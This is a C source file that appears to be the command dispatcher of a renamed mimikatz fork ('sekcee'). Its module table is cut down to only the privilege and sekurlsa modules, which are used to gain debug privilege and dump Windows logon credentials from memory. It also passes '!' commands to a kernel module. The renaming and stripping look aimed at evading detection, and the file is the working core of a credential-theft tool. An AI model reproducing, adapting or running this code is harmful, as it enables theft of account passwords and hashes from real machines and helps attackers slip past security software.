#include "SKA.h"


//const KUHL_M * sekcee_modules[] = {
//	&kuhl_m_crypto,
//	&kuhl_m_sekurlsa,
//	&kuhl_m_kerberos,
//	&kuhl_m_privilege,
//	&kuhl_m_process,
//	&kuhl_m_service,
//	&kuhl_m_lsadump,
//	&kuhl_m_ts,
//	&kuhl_m_event,
//	&kuhl_m_misc,
//	&kuhl_m_token,
//	&kuhl_m_vault,
//#ifdef NET_MODULE
//	&kuhl_m_net,
//#endif
//	&kuhl_m_dpapi,
//	&kuhl_m_sysenv,
//	&kuhl_m_sid,
//};

const KUHL_M * sekcee_modules[] = {
	&kuhl_m_privilege,
	&kuhl_m_sekurlsa,
};

NTSTATUS sekcee_initOrClean(BOOL Init)
{
	unsigned short indexModule;
	PKUHL_M_C_FUNC_INIT function;
	long offsetToFunc;
	NTSTATUS fStatus;
	HRESULT hr;

	if (Init)
	{
		RtlGetNtVersionNumbers(&SEKCEE_NT_MAJOR_VERSION, &SEKCEE_NT_MINOR_VERSION, &SEKCEE_NT_BUILD_NUMBER);
		SEKCEE_NT_BUILD_NUMBER &= 0x00003fff;
		offsetToFunc = FIELD_OFFSET(KUHL_M, pInit);
		hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
		if (FAILED(hr))
			PRINT_ERROR(L"CoInitializeEx: %08x\n", hr);
	}
	else
		offsetToFunc = FIELD_OFFSET(KUHL_M, pClean);

	for (indexModule = 0; indexModule < ARRAYSIZE(sekcee_modules); indexModule++)
	{
		if (function = *(PKUHL_M_C_FUNC_INIT *)((ULONG_PTR)(sekcee_modules[indexModule]) + offsetToFunc))
		{
			fStatus = function();
			if (!NT_SUCCESS(fStatus))
				sekcee_stdout(L">>> %s of \'%s\' module failed : %08x\n", (Init ? L"INIT" : L"CLEAN"), sekcee_modules[indexModule]->shortName, fStatus);
		}
	}

	if (!Init)
	{
		CoUninitialize();
		kull_m_output_file(NULL);
	}
	return STATUS_SUCCESS;
}

BOOL WINAPI HandlerRoutine(DWORD dwCtrlType)
{
	sekcee_initOrClean(FALSE);
	return FALSE;
}


NTSTATUS sekcee_dispatchCommand(wchar_t * input)
{
	NTSTATUS status;
	PWCHAR full;
	if (full = kull_m_file_fullPath(input))
	{
		switch (full[0])
		{
		case L'!':
			status = kuhl_m_kernel_do(full + 1);
			break;
		default:
			status = sekcee_doLocal(full);
		}
		LocalFree(full);
	}
	return status;
}

NTSTATUS sekcee_doLocal(wchar_t * input)
{
	NTSTATUS status = STATUS_SUCCESS;
	int argc;
	wchar_t ** argv = CommandLineToArgvW(input, &argc), *module = NULL, *command = NULL, *match;
	unsigned short indexModule, indexCommand;
	BOOL moduleFound = FALSE, commandFound = FALSE;

	if (argv && (argc > 0))
	{
		if (match = wcsstr(argv[0], L"::"))
		{
			if (module = (wchar_t *)LocalAlloc(LPTR, (match - argv[0] + 1) * sizeof(wchar_t)))
			{
				if ((unsigned int)(match + 2 - argv[0]) < wcslen(argv[0]))
					command = match + 2;
				RtlCopyMemory(module, argv[0], (match - argv[0]) * sizeof(wchar_t));
			}
		}
		else command = argv[0];

		for (indexModule = 0; !moduleFound && (indexModule < ARRAYSIZE(sekcee_modules)); indexModule++)
			if (moduleFound = (!module || (_wcsicmp(module, sekcee_modules[indexModule]->shortName) == 0)))
				if (command)
					for (indexCommand = 0; !commandFound && (indexCommand < sekcee_modules[indexModule]->nbCommands); indexCommand++)
						if (commandFound = _wcsicmp(command, sekcee_modules[indexModule]->commands[indexCommand].command) == 0)
							status = sekcee_modules[indexModule]->commands[indexCommand].pCommand(argc - 1, argv + 1);

		if (!moduleFound)
		{
			PRINT_ERROR(L"\"%s\" module not found !\n", module);
			for (indexModule = 0; indexModule < ARRAYSIZE(sekcee_modules); indexModule++)
			{
				sekcee_stdout(L"\n%16s", sekcee_modules[indexModule]->shortName);
				if (sekcee_modules[indexModule]->fullName)
					sekcee_stdout(L"  -  %s", sekcee_modules[indexModule]->fullName);
				if (sekcee_modules[indexModule]->description)
					sekcee_stdout(L"  [%s]", sekcee_modules[indexModule]->description);
			}
			sekcee_stdout(L"\n");
		}
		else if (!commandFound)
		{
			indexModule -= 1;
			PRINT_ERROR(L"\"%s\" command of \"%s\" module not found !\n", command, sekcee_modules[indexModule]->shortName);

			sekcee_stdout(L"\nModule :\t%s", sekcee_modules[indexModule]->shortName);
			if (sekcee_modules[indexModule]->fullName)
				sekcee_stdout(L"\nFull name :\t%s", sekcee_modules[indexModule]->fullName);
			if (sekcee_modules[indexModule]->description)
				sekcee_stdout(L"\nDescription :\t%s", sekcee_modules[indexModule]->description);
			sekcee_stdout(L"\n");

			for (indexCommand = 0; indexCommand < sekcee_modules[indexModule]->nbCommands; indexCommand++)
			{
				sekcee_stdout(L"\n%16s", sekcee_modules[indexModule]->commands[indexCommand].command);
				if (sekcee_modules[indexModule]->commands[indexCommand].description)
					sekcee_stdout(L"  -  %s", sekcee_modules[indexModule]->commands[indexCommand].description);
			}
			sekcee_stdout(L"\n");
		}

		if (module)
			LocalFree(module);
		LocalFree(argv);
	}
	return status;
}
